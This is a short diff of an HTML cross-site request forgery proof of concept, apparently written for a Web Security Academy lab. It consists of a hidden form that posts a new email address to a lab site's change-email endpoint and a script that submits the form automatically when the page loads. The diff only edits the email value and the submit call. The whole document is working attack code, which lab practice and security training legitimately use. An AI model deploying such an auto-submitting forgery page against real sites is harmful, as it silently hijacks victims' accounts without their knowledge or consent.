@@ -8,12 +8,12 @@
 
     <!-- Form for CSRF attack -->
     <form action="https://0a64001c048e47ea81efd4f1000d0032.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
-        <input type="hidden" name="email" value="xaude@bugcrowdninja.com">
+        <input type="hidden" name="email" value="testing%40bugcrowdninja.net">
     </form>
 
     <script>
         // Automatically submit the form when the page loads
-        document.getElementById("csrf-form").submit();
+        document.forms[0].submit();
     </script>
 
 </body>
